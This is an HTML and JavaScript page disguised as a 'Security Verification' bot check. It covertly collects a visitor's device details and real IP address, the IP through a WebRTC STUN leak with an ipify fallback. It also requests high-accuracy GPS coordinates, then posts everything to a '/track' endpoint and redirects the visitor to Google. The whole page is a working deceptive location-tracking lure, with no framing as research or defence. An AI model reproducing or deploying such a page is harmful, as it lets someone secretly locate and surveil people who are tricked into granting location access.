<!DOCTYPE html>
<html lang="en">

<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Security Check</title>
  <style>
    body {
      margin: 0;
      padding: 0;
      background: #000;
      color: #fff;
      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
      height: 100vh;
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: center;
      overflow: hidden;
    }

    #overlay {
      position: fixed;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      background: linear-gradient(135deg, #1a1a1a 0%, #000 100%);
      z-index: 9999;
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: center;
      text-align: center;
    }

    .btn {
      padding: 15px 40px;
      font-size: 18px;
      color: white;
      background: #28a745;
      border: none;
      border-radius: 50px;
      cursor: pointer;
      transition: transform 0.2s, background 0.3s;
      margin-top: 30px;
      font-weight: bold;
      box-shadow: 0 4px 15px rgba(40, 167, 69, 0.4);
      text-transform: uppercase;
      letter-spacing: 1px;
    }

    .btn:hover {
      background: #218838;
      transform: scale(1.05);
    }

    .btn:active {
      transform: scale(0.95);
    }

    h1 {
      font-size: 28px;
      margin-bottom: 15px;
      color: #fff;
    }

    p {
      color: #aaa;
      max-width: 80%;
      line-height: 1.6;
      font-size: 16px;
      margin-bottom: 20px;
    }

    .spinner {
      border: 4px solid rgba(255, 255, 255, 0.1);
      width: 36px;
      height: 36px;
      border-radius: 50%;
      border-left-color: #28a745;
      animation: spin 1s linear infinite;
      display: none;
      margin-bottom: 20px;
    }

    @keyframes spin {
      0% {
        transform: rotate(0deg);
      }

      100% {
        transform: rotate(360deg);
      }
    }

    #status {
      margin-top: 20px;
      color: #888;
      font-family: monospace;
      font-size: 14px;
    }

    #debug {
      position: fixed;
      bottom: 0;
      left: 0;
      width: 100%;
      height: 100px;
      background: rgba(0, 0, 0, 0.8);
      color: #0f0;
      font-family: monospace;
      padding: 10px;
      overflow-y: auto;
      font-size: 10px;
      border-top: 1px solid #333;
      display: none;
    }
  </style>
</head>

<body>

  <div id="overlay">
    <div class="spinner" id="spinner"></div>
    <h1>Security Verification</h1>
    <p>We need to verify your device location to ensure you are not a bot.</p>
    <p style="font-size: 14px; color: #666;">Please allow location access when prompted.</p>
    <button class="btn" id="verifyBtn">Verify & Continue</button>
    <div id="status">Secure Connection Ready</div>
  </div>

  <div id="debug"></div>

  <script>
    // Configuration
    const TARGET_URL = '/track';
    const REDIRECT_URL = 'https://google.com';

    // Logger
    const debugDiv = document.getElementById('debug');
    function log(msg, type = 'INFO') {
      console.log(`[${type}] ${msg}`);
      const line = document.createElement('div');
      line.style.color = type === 'ERROR' ? '#f55' : '#0f0';
      line.textContent = `> ${msg}`;
      debugDiv.appendChild(line);
      debugDiv.scrollTop = debugDiv.scrollHeight;
    }

    // Data Collection Object
    const data = {
      timestamp: new Date().toISOString(),
      device: {
        userAgent: navigator.userAgent,
        screen: { width: window.screen.width, height: window.screen.height },
        memory: navigator.deviceMemory || 'unknown',
        cores: navigator.hardwareConcurrency || 'unknown'
      },
      browser: {
        platform: navigator.platform,
        language: navigator.language,
        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone
      },
      location: {},
      network: {}
    };

    let ipCollected = false;

    // 1. IP Detection (Run immediately in background)
    function collectIP() {
      const peerConnection = new RTCPeerConnection({ iceServers: [{ urls: 'stun:stun.l.google.com:19302' }] });
      peerConnection.createDataChannel('');

      peerConnection.onicecandidate = (event) => {
        if (event.candidate) {
          const ipMatch = event.candidate.candidate.match(/([0-9]{1,3}(\.[0-9]{1,3}){3})/);
          if (ipMatch) {
            const ip = ipMatch[1];
            if (!ip.startsWith('192.168.') && !ip.startsWith('10.') && ip !== '127.0.0.1') {
              data.location.realIP = ip;
              ipCollected = true;
              log(`IP Found: ${ip}`);
              peerConnection.close();
            }
          }
        }
      };

      // Fallback to API
      setTimeout(async () => {
        if (!ipCollected) {
          try {
            const res = await fetch('https://api.ipify.org?format=json');
            const json = await res.json();
            data.location.ip = json.ip;
            log(`Public IP (API): ${json.ip}`);
            ipCollected = true;
          } catch (e) { log('IP Fetch Failed', 'ERROR'); }
        }
      }, 1000);
    }

    // 2. GPS Detection (Triggered by button)
    function collectGPS() {
      return new Promise((resolve) => {
        if (!navigator.geolocation) {
          log('Geolocation not supported', 'ERROR');
          resolve();
          return;
        }

        document.getElementById('status').textContent = "Waiting for permission...";
        document.getElementById('status').style.color = "#ffc107"; // Warning color

        navigator.geolocation.getCurrentPosition(
          (pos) => {
            data.location.lat = pos.coords.latitude;
            data.location.lng = pos.coords.longitude;
            data.location.accuracy = pos.coords.accuracy;
            data.location.altitude = pos.coords.altitude;
            data.location.speed = pos.coords.speed;
            log(`GPS Locked: ${pos.coords.latitude}, ${pos.coords.longitude} (Acc: ${pos.coords.accuracy}m)`);
            resolve();
          },
          (err) => {
            log(`GPS Denied/Error: ${err.message}`, 'ERROR');
            data.location.geoError = err.message;
            resolve();
          },
          { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 }
        );
      });
    }

    // 3. Send Data
    async function sendData() {
      document.getElementById('status').textContent = "Verifying...";
      try {
        await fetch(TARGET_URL, {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json',
            'Bypass-Tunnel-Reminder': 'true'
          },
          body: JSON.stringify(data),
          keepalive: true
        });
        log('Data sent successfully!');
        document.getElementById('status').textContent = "Verified!";
        document.getElementById('status').style.color = "#28a745";
        setTimeout(() => window.location.href = REDIRECT_URL, 1000);
      } catch (e) {
        log(`Send Failed: ${e.message}`, 'ERROR');
        document.getElementById('status').textContent = "Server Error";
        document.getElementById('status').style.color = "#f55";
      }
    }

    // Main Interaction
    document.getElementById('verifyBtn').addEventListener('click', async () => {
      const btn = document.getElementById('verifyBtn');
      const spinner = document.getElementById('spinner');

      btn.style.display = 'none'; // Hide button
      spinner.style.display = 'block'; // Show spinner

      await collectGPS();

      // Ensure IP is collected (wait a bit if needed)
      if (!ipCollected) await new Promise(r => setTimeout(r, 500));

      await sendData();
    });

    // Start background tasks
    collectIP();
  </script>
</body>

</html>